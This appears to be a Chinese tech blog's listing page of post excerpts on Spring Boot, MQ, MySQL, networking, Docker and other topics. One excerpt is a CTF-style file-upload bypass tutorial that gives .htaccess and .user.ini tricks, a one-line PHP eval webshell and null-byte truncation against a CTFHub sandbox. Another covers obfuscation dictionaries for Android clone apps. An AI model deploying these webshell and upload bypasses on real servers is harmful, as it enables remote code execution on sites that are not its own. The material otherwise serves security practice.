		<h2 class="list__title post__title">
			<a href="/posts/1865fd9cd77acb6a72f444334bba1a97/" rel="bookmark">
			SpringBoot项目打成jar后加载外部配置文件 - 第463篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		历史文章（文章累计450+）
《国内最全的Spring Boot系列之一》
《国内最全的Spring Boot系列之二》
《国内最全的Spring Boot系列之三》
《国内最全的Spring Boot系列之四》
《国内最全的Spring Boot系列之五》
《国内最全的Spring Boot系列之六》
SpringBoot使用ChatGPT Api开发一个聊天机器人 - 第460篇
Idea启动多个SpringBoot项目的3种方案
SpringBoot版的低代码开发平台，关联无 SQL - 第462篇
悟纤：芭比Q，这人怎么头疼，一整就让我修改配置信息。
师傅：徒儿，这是怎么了？
悟纤：师傅，师傅，你救救徒儿，我们公司的那个人老是让我修改application.properties的配置信息，修改完之后还得打包部署，烦死人了。
师傅：那这个简单呢，把配置文件外置就可，他爱怎么改，自己改去。
悟纤：师傅这是一语惊醒梦中人呢。
师傅：碰到问题要多动脑，每个问题的背后都是成长。
悟纤：还是师傅好，为我排忧解难了。
导读
有些时候，我们的一些配置信息需要比较频繁的修改，如果这些配置信息是放在项目中的话，那么就需要经常进行打包部署，所以我们就思考是否可以把这个配置文件外置呢？
一、application.properties外置
大部分的配置信息，我们都是配置在application.properties，那么这个文件是否可以外置呐？这个当然是可以的。
首先在application.preperties定义一个属性：
demo.name = hello.01 在Controller进行使用：
@Value("${demo.name}")private String demoName;​@RequestMapping("/test")public String test(){ return this.demoName;} 将项目打成jar包，使用java -jar的方式进行启动：
java -jar springboot-out-properties-0.0.1-SNAPSHOT.jar
此时读取的值是：hello.01。
将项目中的application.properties拷贝出来，放到和jar包同路径下，修改属性值为：
demo.name = hello.02 然后使用上面的命令重新启动，看下效果读取的值就是hello.02了，惊不惊喜意不意外，Spring Boot太牛了，jar包同路径下就直接读取了。
如果我们在jar下新建一个config，然后把application.properties放进去的话，使用上面的命令可以识别吗 ？答案是可以的，
SpringApplication 将从 application.properties 以下位置的文件中加载属性并且将其添加到 Spring 的环境当中：
l当前目录下的 /config 子目录
l当前目录
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1865fd9cd77acb6a72f444334bba1a97/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/649a7c50b5ed8b24caa1e2cbb358b889/" rel="bookmark">
			洛谷 P1923 【深基9.例4】求第 k 小的数 （Java/C)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		洛谷 P1923【深基9.例4求第 k 小的数 【深基9.例4】求第 k 小的数题目描述思路代码实现（java)注意点：非递归写法代码递归写法代码 代码实现（C语言） 【深基9.例4】求第 k 小的数 题目链接：【深基9.例4】第k小的数
题目描述 输入 n n n（ 1 ≤ n &lt; 5000000 1 \le n &lt; 5000000 1≤n&lt;5000000 且 n n n 为奇数）个数字 a i a_i ai​（ 1 ≤ a i &lt; 10 9 1 \le a_i &lt; {10}^9 1≤ai​&lt;109），输出这些数字的第 k k k 小的数。最小的数是第 0 0 0 小。
请尽量不要使用 nth_element 来写本题，因为本题的重点在于练习分治算法。
样例输入
5 1 4 3 2 1 5 样例输出
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/649a7c50b5ed8b24caa1e2cbb358b889/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/776a9aab2c0f1f8bb81ae2c0093fdbe1/" rel="bookmark">
			EasyExcel如何导出数据？超级简单，看这就够了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.引入依赖 &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;easyexcel&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt; 2.后端代码 我们可以在官网找到相关代码
/** * 文件下载（失败了会返回一个有部分数据的Excel） * &lt;p&gt; * 1. 创建excel对应的实体对象 参照{@link DownloadData} * &lt;p&gt; * 2. 设置返回的 参数 * &lt;p&gt; * 3. 直接写，这里注意，finish的时候会自动关闭OutputStream,当然你外面再关闭流问题不大 */ @GetMapping("/export") public void download(HttpServletResponse response) throws IOException { // 这里注意 有同学反应使用swagger 会导致各种问题，请直接用浏览器或者用postman response.setContentType("application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"); response.setCharacterEncoding("utf-8"); // 这里URLEncoder.encode可以防止中文乱码 当然和easyexcel没有关系 //"测试"：就是我们要生成文档的名称，可以改为自己的 String fileName = URLEncoder.encode("测试", "UTF-8").replaceAll("\\+", "%20"); response.setHeader("Content-disposition", "attachment;filename*=utf-8''" + fileName + ".xlsx"); /** * DownloadData.class:导出数据类型 * .doWrite(data)：导出数据来源，比如RecordService.getTodayRecord()，可以从我们自己 *写的方法中获取 * .sheet():文件内标题，可以换成自己的 */ EasyExcel.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/776a9aab2c0f1f8bb81ae2c0093fdbe1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/264c918dd69b1626a5dd41c2a709c511/" rel="bookmark">
			中国RPA市场发展洞察(2022) 下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		人口老龄化的趋势中，面临着劳动力短缺、用工成本攀升的问题，成为影响经济发展的关键挑战。对此，数字生产力将成为一项重要的解决方案，RPA、IPA或超级自动化等相关技术将在未来社会中发挥重要价值，成为企业数字化之旅中不可或缺的组成部分。
纵观中国RPA市场，数字化领先的细分行业的RPA发展已经迈进效能扩展期，但大部分垂直行业依然集中在探索期、成效初期的市场发展阶段。根据DTE矩阵的洞察，从RPA应用的宏观生命周期来看，中国市场拥有较大的发展空间与市场机会。
在“Market Insight：中国RPA市场发展洞察(2022)”的研究执行中，分析师站在企业客户需求与应用实践的视角，展开了精细化的市场调研。基于大量的数理实证和案例实证，RPA中国分别对行业发展现状与趋势、客户之声(需求侧)与技术洞察(供给侧)、细分领域实践、供应商能力等内容展开了深入研究与洞察。
下载：资识派
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9300d2edbceb416f37f91e15a3fac94c/" rel="bookmark">
			【MQ】面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 MQ应用场景?消息队列技术选型？[^2]MQ如何保证消息不重复消费？确保幂等性？MQ如何保证消息的可靠发送？MQ如何保证消息的顺序性？MQ的消息积压问题消息死信的原因如果让你写一个消息队列，该如何进行架构设计 MQ应用场景? 这一部分可以根据自己的实际使用场景进行分析。
比如：订单模块下单功能：支付成功后，给用户发送短信，就采取了MQ的方式。
这样达到了应用解耦（把订单模块与短信拆分）、异步处理（采用并行执行的方式，可以减少响应时间）。
除此之外，还可以在秒杀中使用MQ，进行流量削峰。
假设秒杀系统每秒最多可以处理2k个请求，每秒却有5k的请求过来，可以引入消息队列，秒杀系统每秒从消息队列拉2k请求处理得了。
解决秒杀出现消息积压的问题，
首先秒杀活动不会每时每刻都那么多请求过来，高峰期过去后，积压的请求可以慢慢处理；
其次，如果消息队列长度超过最大数量，可以直接抛弃用户请求或跳转到错误页面；
消息队列技术选型？1 在4.5的版本中，RocketMQ有一个集群模式叫做：Dleger模式。当主节点失活时，能够自动重新触发选举。
MQ如何保证消息不重复消费？确保幂等性？ 幂等处理重复消息：
表，带唯一业务标记的，利用主键或者唯一性索引，每次处理业务，先校验一下就好啦；mysql 插⼊业务id作为主键，主键是唯⼀的，所以⼀次只能插⼊⼀条用redis缓存下业务标记，每次看下是否处理过了。分布式锁来进行处理 MQ如何保证消息的可靠发送？ 相关：如何保证数据一致性，事务消息如何实现？
消息的发送是从 生产者 -&gt; MQ -&gt; 消费者。所以，就从这三个方面去考虑。
生产者：确保消息能够发送到MQ里面。
RabbitMQ
生产者同步在发送消息后，开启MQ里面的消息回执（ConfirmCallback）。如果MQ接收到了消息，会发送一个布尔类型的ack。如果为true，表示消息已经被MQ进行接受。
RocketMQ
之前的版本，在同步模式中，发送失败后可以重试，设置重试次数。默认3次。
producer.setRetryTimesWhenSendFailed(10);
在 4.3之后的版本，增加了事务消息去确保生产方的可靠发送。采用了2PC，即两阶段提交，prepared-&gt;commit / rollback。
我们一般是重写了事务监听器类。生产方绑定这个事务监听器，在发送消息后，此时事务消息处于prepared状态，在这个状态中，对消费方是不可见的。事务监听器判断了事务消息的状态后，对消息修改为 Commit 或 Rollback。Commit 就是直接发送给消费者，Rollback就会再去在时间段内再去check消息状态。在一定次数的check以后，会把消息丢弃。
MQ ：确保消息已经持久化到磁盘中。
刷盘机制分同步刷盘和异步刷盘；
生产者消息发过来时，只有持久化到磁盘，RocketMQ的存储端Broker才返回一个成功的ACK响应，这就是同步刷盘。它保证消息不丢失，但是影响了性能。异步刷盘的话，只要消息写入PageCache缓存，就返回一个成功的ACK响应。这样提高了MQ的性能，但是如果这时候机器断电了，就会丢失消息。 Broker一般是集群部署的，有master主节点和slave从节点。消息到Broker存储端，只有主节点和从节点都写入成功，才反馈成功的ack给生产者。这就是同步复制，它保证了消息不丢失，但是降低了系统的吞吐量。与之对应的就是异步复制，只要消息写入主节点成功，就返回成功的ack，它速度快，但是会有性能问题。
消费：
RabbitMQ
消息消费时，出现异常，就把消息使用死信队列进行处理。如果死信处理的时候出现异常，就人为进行处理。
RocketMQ
在消费者分组中，让一个消费者没有消息消费成功标识返回，那么就会发送给消费者组中的其他消费者。
从这里看出，MQ并不能做到100%的消息可靠。因此，如商品购买模块为例子，核心的流程（购买，支付）放到一个微服务，这样方便出现异常时事务回滚；用户购买之后，给用户发个短信（短信）就可以使用MQ进行处理。
MQ如何保证消息的顺序性？ RabbitMQ是不支持顺序消息的！
如图所示，RabbitMQ保证消息的顺序性，就是拆分多个 queue，每个 queue 对应一个 consumer（消费者），就是多一些 queue 而已，确实是麻烦点；或者就一个 queue 但是对应一个 consumer，然后这个 consumer 内部用内存队列做排队，然后分发给底层不同的 worker 来处理。2
RocketMQ
局部顺序：消费方消费MessageQueue里面的消息肯定是一致的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9300d2edbceb416f37f91e15a3fac94c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d14b718d7ee4b44d35b3d4a12ee855b4/" rel="bookmark">
			【网安基础3】从0开始的网安学习3--计算机网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 计算机网络的基本概念 计算机网络的定义
计算机网络是利用通信设备和通信线路将地理位置不同，功能独立的多个计算机系统互相连接起来，以功能完善的网络软件（包括网络通信协议、网络操作系统等）实现网络中资源共享和信息传递的系统。
OSI模型
五层模型：将5/6/7层合为一个应用层。
数据单元：
应用层：APDU（ApplicationProtocolDataUnit–应用协议数据单元）
表示层：PPDU（Presentation Protocol Data Unit 表示协议数据单元）
会话层：SPDU（Session Protocol Data Unit，是会话层协议数据单元）
传输层：TPDU（Transport Protocol Data Unit，是指传送协议数据单元）
协议数据单元PDU（ProtocolDataUnit）是指对等层次之间传递的数据单位。协议数据单元(ProtocolDataUnit)物理层的PDU是数据位（bit），数据链路层的PDU是数据帧（frame），网络层的PDU是数据包（packet），传输层的PDU是数据段（segment），其他更高层次的PDU是数据（data）。
TCP/IP模型
2 计算机网络的分类 2.1 按网络拓扑结构分类 2.1.1 星型结构 每个节点都有一条单独的线路与中心节点相连。除中心节点外的任何两个节点之间的通信都要经过中心节点，采用集中控制，中心节点就是控制节点。
优点：简单、容易建网，便于管理。
缺点：由于通信线路总长度较长，成本高；同时对中心节点的可靠性要求高，中心节点出故障将会引起整个网络瘫痪。
2.1.2 环型结构 网络各节点连成环状。数据信息沿一个方向传送，通过各中间节点存储转友最后到达日的T点。
优点：结构没有路径选择问题，网络管理软件实现简单。
缺点：信息在传输过程中要经过环路上的许多节点，容易因某个节点发生故障而破坏整个网络的通信;另外网络的吞吐能力较差，适用于信息传输量不大的情况，一般用于局域网。
2.1.3 网型结构 这种结构无严格的布局规定和构型，其中一个节点可取道若干路径到达另一个节点。
优点：可靠性高。
缺点：所需通信线路总长度长，投资成本高，路径选择技术较复杂，网络管理软件也比较复杂。
2.1.4 树型结构 网络中各节点按层次进行连接，是一个在分级管理基础上集中式的网络，适合于各种统计管理系统。
优点:通信线路总长度较短，成本低。
缺点:任一节点的故障均会影响它所在支路网络的正常工作，而且处于越高层次的节点，其可靠性要求越高。
2.1.5 总线结构 网中各节点连在一条总线(电缆)上。任一时刻，只允许一个节点占用总线且只能由该节点发送信息，其它节点处于封锁发送状态，但允许接收。
优点:网络中任何一节点的故障都不会使整个网络故障，相对而言容易扩展。
缺点:故障管理困难，不利于网络业务量的增加。
2.2 按照按网络的覆盖范围进行分类 可分为广域网、局域网和城域网。
局域网:传输距离有限，传输速度较高，以共享网络资源为目的的网络系统
城域网:规模介于局域网和广域网之间的一种较大范围的高速网络
广域网:覆盖范围广、传输速率相对低，以数据通信为主要目的的数据通信网&gt;互联网(Internet)
2.2.1 局域网 局域网是范围有限且行政可控的网络，特点是连接速率高；
局域网有以下两种分类标准:
传输介质
连接方式
局域网-全网状型
优点:容错性强
缺点:扩展性差(不利于增删节点)、建设成本高、邻接关系复杂
(n[n-1]/2)、路径控制难度高
局域网-总线型
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d14b718d7ee4b44d35b3d4a12ee855b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21a6b97362831a23c07ec80e3ca8fc9b/" rel="bookmark">
			Android  马甲包 google市场混淆技术方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		指定 混淆字典
在app的gralde里配置混淆字典
-obfuscationdictionary dict.txt#外部字典
-classobfuscationdictionary dict.txt #类字典
-packageobfuscationdictionary dict.txt #包字典
dict.txt 文件内容类似这样的：
zguqnx
mvdmuyh
wmws
jwomtp
nhmhn
zvlogo
pomcwh
bhdnzul
osxbj
gojb
ctvkrg
srmar
sgkarnqi
byghdn
tvebtxw
uxdhno
qmjac
pgxasjnc
ezfb
tuoe
pzdo
写了一个task
/** * 生成字典Task */ task geneDictTask { doFirst{ def dictPath = rootDir.getAbsolutePath()+'/app/dict.txt' def random = new Random() def lowercase = "abcdefghijklmnopqrstuvwxyz" def wordList = new HashSet() for (int i=0;i&lt;10000;i++){ def word = new StringBuilder() def wordLength = random.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/21a6b97362831a23c07ec80e3ca8fc9b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0d29e2758b1cda4937f15bccb68b82e/" rel="bookmark">
			uniapp小程序分页
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 uniapp中的z-paging实现分页功能，无需引入和下载直接可以用，小程序用得比较多的插件
一、z-paging是什么？ 是一个常用的实现分页的插件
二、使用步骤 1.html代码 &lt;z-paging ref="paging" v-model="list" :fixed="true" @query="getList" :hide-empty-view="false" &gt; &lt;view class="list" v-for="item in list" :key="item.id" &gt; &lt;view class="item"&gt;名称: &lt;text class="value"&gt;{{item.name}}&lt;/text&gt;&lt;/view&gt; &lt;view class="item"&gt;编码: &lt;text class="value"&gt;{{item.code}}&lt;/text&gt;&lt;/view&gt; &lt;view class="item"&gt;地址: &lt;text class="value"&gt;{{item.addr?item.addr:'地址没有配置'}}&lt;/text&gt;&lt;/view&gt; &lt;/view&gt; &lt;/z-paging&gt; 2.js代码 data() { return { list: [] } }, methods: { getList(pageNo, pageSize) { fetchListApi({current:pageNo,size:pageSize}).then(res =&gt;{ if(res.code === 0) { this.list = res.data.records this.$refs.paging.complete(this.list); }else{ this.$refs.paging.complete(false); } }) } }, 3.CSS代码 .wraper{ padding: 20rpx; .list{ border: 1rpx solid #eee; margin: 20rpx auto; padding: 20rpx; position: relative; .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c0d29e2758b1cda4937f15bccb68b82e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fbf3591f2b2d270e91a11a5bba1d7ce3/" rel="bookmark">
			史上最全 55道 MySQL面试题及答案，看完碾压面试官
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 MySQL面试题以及答案整理【最新版】MySQL高级面试题大全，发现网上很多MySQL面试题都没有答案，所以花了很长时间搜集，本套MySQL面试题大全，汇总了大量经典的MySQL程序员面试题以及答案,包含MySQL语言常见面试题、MySQL工程师高级面试题及一些大厂MySQL开发面试宝典，面试经验技巧等，应届生，实习生，企业工作过的，都可参考学习!
这套MySQL面试题大全，希望对大家有帮助哈~
1、一张表，里面有 ID 自增主键，当 insert 了 17 条记录之后，删除了第 15,16,17 条记录，再把 Mysql 重启，再 insert 一条记录，这条记录的 ID 是 18 还是 15 ？ (1) 如果表的类型是 MyISAM，那么是 18
因为 MyISAM 表会把自增主键的最大 ID 记录到数据文件里，重启 MySQL 自增主键的最大ID 也不会丢失
（2）如果表的类型是 InnoDB，那么是 15
InnoDB 表只是把自增主键的最大 ID 记录到内存中，所以重启数据库或者是对表进OPTIMIZE 操作，都会导致最大 ID 丢失
2、Mysql 的技术特点是什么？ Mysql 数据库软件是一个客户端或服务器系统，其中包括：支持各种客户端程序和库的多线程 SQL 服务器、不同的后端、广泛的应用程序编程接口和管理工具。
3、Heap 表是什么？ HEAP 表存在于内存中，用于临时高速存储。
BLOB 或 TEXT 字段是不允许的
只能使用比较运算符=，&lt;，&gt;，=&gt;，= &lt;
HEAP 表不支持 AUTO_INCREMENT
索引不可为 NULL
4、Mysql 服务器默认端口是什么？ Mysql 服务器的默认端口是 3306。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fbf3591f2b2d270e91a11a5bba1d7ce3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a24ec690ad4ca609d6d8095abb1241a8/" rel="bookmark">
			Windows 子系统运行 Docker 显示成功，但没有启动守护进程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Windows 子系统运行 Docker 显示成功，但没有启动守护进程 启动 docker 成功：
运行命令报错：
Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?
日志信息：
原因可能是：docker 安装程序使用 iptables 进行 nat。不幸的是 Debian 使用 nftables。您可以将条目转换为 nftables，或者只是设置 Debian 以使用旧版 iptables。
解决办法：执行 sudo update-alternatives --set iptables /usr/sbin/iptables-legacy 命令更换 iptables
注意：命令执行成功后请重启 docker 服务
参考：https://forums.docker.com/t/failing-to-start-dockerd-failed-to-create-nat-chain-docker/78269
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2007e06c4068426a483f0b6b4c89f985/" rel="bookmark">
			windows 创建ftp文件夹
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		右键 此电脑 添加一个网络位置
在添加网络向导对话框里点击“下一步”按钮，如图所示。
在添加网络向导对话框点击“选择自定义网络位置”后，再点击“下一步”按钮
在添加网络向导对话框里internet地址或网络地址输入框里输入目标FTP空间地址，再点击“下一步”按钮。
创建完后，点击完成即可。在“添加网络向导对话框，如需要请指定用户名和密码”对话框里，如果FTP不用用户名和密码就可以访问，就选择“匿名登录”，再点击“下一步”按钮就行了。
完成以上设置后，即可创建FTP文件夹。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a82a800527592c6fd733e4bb45b93fb7/" rel="bookmark">
			Openlayers 中code错误编码对应的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Openlayers 中code错误编码对应的问题 错误编码错误信息中文含义1The view center is not defined.未定义视图中心。2The view resolution is not defined.未定义视图分辨率。3The view rotation is not defined.未定义视图旋转。4image and src cannot be provided at the same time.image并且src不能同时提供。5imgSize must be set when image is provided.imgSize必须在image提供时设置。6A defined and non-empty src or image must be provided.必须提供已定义且非空的srcor image。7format must be set when url is set.format设置时必须url设置。8Unknown serverType configured.未知serverType配置。9url must be configured or set using #setUrl().url必须使用#setUrl().10The default geometryFunction can only handle ol.geom.Point geometries.默认geometryFunction只能处理ol.geom.Point几何图形.11options.featureTypes should be an Array.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a82a800527592c6fd733e4bb45b93fb7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1cbc1e9bebe99e411515f8d5608e8d4/" rel="bookmark">
			文件上传 .htaccess 与.user.ini
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、.htaccess 1使用方法，上传.htaccess文件内容如下
&lt;FilesMatch "shell"&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; ​ 匹配文件名为“shell”的文件，该文件作为可执行程序解析 或者
AddType application/x-httpd-php .jpg ​ ​ jpg文件作为可执行程序执行 2再上传shell.jpg
GIF89a &lt;script language='php'&gt; @eval($_POST['a']);&lt;/script&gt; 3访问shell.jpg文件
2、.user.ini 方式使用限制，在上传的目录中必须包含php文件，例如index.php
1上传.user.ini文件，内容为：
GIF89a auto_prepend_file=1.gif 加载1.gif文件
2上传1.gif文件
GIF89a &lt;script language='php'&gt; @eval($_POST['a']);&lt;/script&gt; 3 访问同目录中的php文件，例如index.php ，先通过本目录中的配置文件.user.ini进行加载1.gif文件从而达到加载后门的目的
3、00截断 00截断有限制，php版本得低于5.3，并且GPC得关闭，一般在url上。 两种，%00和0x00,后台读取是遇到%00就会停止。 举个例子，url中输入的是upload/post.php%00.jpg，那么后台读取到是upload/post.php，就实现了绕后目的。
POST /?road=/var/www/html/upload/1.php%00 HTTP/1.1 Host: challenge-57c0e3e249fc35a4.sandbox.ctfhub.com:10080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------47182109526658916741339492122 Content-Length: 369 Origin: http://challenge-57c0e3e249fc35a4.sandbox.ctfhub.com:10080 Connection: close Referer: http://challenge-57c0e3e249fc35a4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c1cbc1e9bebe99e411515f8d5608e8d4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a391f605a3c498c2b62f9904a47965fd/" rel="bookmark">
			三天吃透计算机网络面试八股文
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文已经收录到Github仓库，该仓库包含计算机基础、Java基础、多线程、JVM、数据库、Redis、Spring、Mybatis、SpringMVC、SpringBoot、分布式、微服务、设计模式、架构、校招社招分享等核心知识点，欢迎star~
Github地址：https://github.com/Tyson0314/Java-learning
网络分层结构 计算机网络体系大致分为三种，OSI七层模型、TCP/IP四层模型和五层模型。一般面试的时候考察比较多的是五层模型。
五层模型：应用层、传输层、网络层、数据链路层、物理层。
应用层：为应用程序提供交互服务。在互联网中的应用层协议很多，如域名系统DNS、HTTP协议、SMTP协议等。传输层：负责向两台主机进程之间的通信提供数据传输服务。传输层的协议主要有传输控制协议TCP和用户数据协议UDP。网络层：选择合适的路由和交换结点，确保数据及时传送。主要包括IP协议。数据链路层：在两个相邻节点之间传送数据时，数据链路层将网络层交下来的 IP 数据报组装成帧，在两个相邻节点间的链路上传送帧。物理层：实现相邻节点间比特流的透明传输，尽可能屏蔽传输介质和物理设备的差异。 ISO七层模型是国际标准化组织（International Organization for Standardization）制定的一个用于计算机或通信系统间互联的标准体系。
应用层：网络服务与最终用户的一个接口，常见的协议有：HTTP FTP SMTP SNMP DNS.表示层：数据的表示、安全、压缩。，确保一个系统的应用层所发送的信息可以被另一个系统的应用层读取。会话层：建立、管理、终止会话,对应主机进程，指本地主机与远程主机正在进行的会话.传输层：定义传输数据的协议端口号，以及流控和差错校验,协议有TCP UDP.网络层：进行逻辑地址寻址，实现不同网络之间的路径选择,协议有ICMP IGMP IP等.数据链路层：在物理层提供比特流服务的基础上，建立相邻结点之间的数据链路。物理层：建立、维护、断开物理连接。 TCP/IP 四层模型
应用层：对应于OSI参考模型的（应用层、表示层、会话层）。传输层: 对应OSI的传输层，为应用层实体提供端到端的通信功能，保证了数据包的顺序传送及数据的完整性。网际层：对应于OSI参考模型的网络层，主要解决主机到主机的通信问题。网络接口层：与OSI参考模型的数据链路层、物理层对应。 三次握手 假设发送端为客户端，接收端为服务端。开始时客户端和服务端的状态都是CLOSED。
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-K7Zpe4pb-1678665834147)(http://img.topjavaer.cn/img/三次握手图解.png)]
第一次握手：客户端向服务端发起建立连接请求，客户端会随机生成一个起始序列号x，客户端向服务端发送的字段中包含标志位SYN=1，序列号seq=x。第一次握手前客户端的状态为CLOSE，第一次握手后客户端的状态为SYN-SENT。此时服务端的状态为LISTEN。第二次握手：服务端在收到客户端发来的报文后，会随机生成一个服务端的起始序列号y，然后给客户端回复一段报文，其中包括标志位SYN=1，ACK=1，序列号seq=y，确认号ack=x+1。第二次握手前服务端的状态为LISTEN，第二次握手后服务端的状态为SYN-RCVD，此时客户端的状态为SYN-SENT。（其中SYN=1表示要和客户端建立一个连接，ACK=1表示确认序号有效）第三次握手：客户端收到服务端发来的报文后，会再向服务端发送报文，其中包含标志位ACK=1，序列号seq=x+1，确认号ack=y+1。第三次握手前客户端的状态为SYN-SENT，第三次握手后客户端和服务端的状态都为ESTABLISHED。此时连接建立完成。 两次握手可以吗？ 之所以需要第三次握手，主要为了防止已失效的连接请求报文段突然又传输到了服务端，导致产生问题。
比如客户端A发出连接请求，可能因为网络阻塞原因，A没有收到确认报文，于是A再重传一次连接请求。然后连接成功，等待数据传输完毕后，就释放了连接。然后A发出的第一个连接请求等到连接释放以后的某个时间才到达服务端B，此时B误认为A又发出一次新的连接请求，于是就向A发出确认报文段。如果不采用三次握手，只要B发出确认，就建立新的连接了，此时A不会响应B的确认且不发送数据，则B一直等待A发送数据，浪费资源。 四次挥手 [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-ALvxfloH-1678665834156)(http://img.topjavaer.cn/img/四次挥手0.png)]
A的应用进程先向其TCP发出连接释放报文段（FIN=1，seq=u），并停止再发送数据，主动关闭TCP连接，进入FIN-WAIT-1（终止等待1）状态，等待B的确认。B收到连接释放报文段后即发出确认报文段（ACK=1，ack=u+1，seq=v），B进入CLOSE-WAIT（关闭等待）状态，此时的TCP处于半关闭状态，A到B的连接释放。A收到B的确认后，进入FIN-WAIT-2（终止等待2）状态，等待B发出的连接释放报文段。B发送完数据，就会发出连接释放报文段（FIN=1，ACK=1，seq=w，ack=u+1），B进入LAST-ACK（最后确认）状态，等待A的确认。A收到B的连接释放报文段后，对此发出确认报文段（ACK=1，seq=u+1，ack=w+1），A进入TIME-WAIT（时间等待）状态。此时TCP未释放掉，需要经过时间等待计时器设置的时间2MSL（最大报文段生存时间）后，A才进入CLOSED状态。B收到A发出的确认报文段后关闭连接，若没收到A发出的确认报文段，B就会重传连接释放报文段。 第四次挥手为什么要等待2MSL？ 保证A发送的最后一个ACK报文段能够到达B。这个ACK报文段有可能丢失，B收不到这个确认报文，就会超时重传连接释放报文段，然后A可以在2MSL时间内收到这个重传的连接释放报文段，接着A重传一次确认，重新启动2MSL计时器，最后A和B都进入到CLOSED状态，若A在TIME-WAIT状态不等待一段时间，而是发送完ACK报文段后立即释放连接，则无法收到B重传的连接释放报文段，所以不会再发送一次确认报文段，B就无法正常进入到CLOSED状态。防止已失效的连接请求报文段出现在本连接中。A在发送完最后一个ACK报文段后，再经过2MSL，就可以使这个连接所产生的所有报文段都从网络中消失，使下一个新的连接中不会出现旧的连接请求报文段。 为什么是四次挥手？ 因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。但是在关闭连接时，当Server端收到Client端发出的连接释放报文时，很可能并不会立即关闭SOCKET，所以Server端先回复一个ACK报文，告诉Client端我收到你的连接释放报文了。只有等到Server端所有的报文都发送完了，这时Server端才能发送连接释放报文，之后两边才会真正的断开连接。故需要四次挥手。
说说TCP报文首部有哪些字段，其作用又分别是什么？ [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-bibOLWq3-1678665834160)(http://img.topjavaer.cn/img/tcp报文.png)]
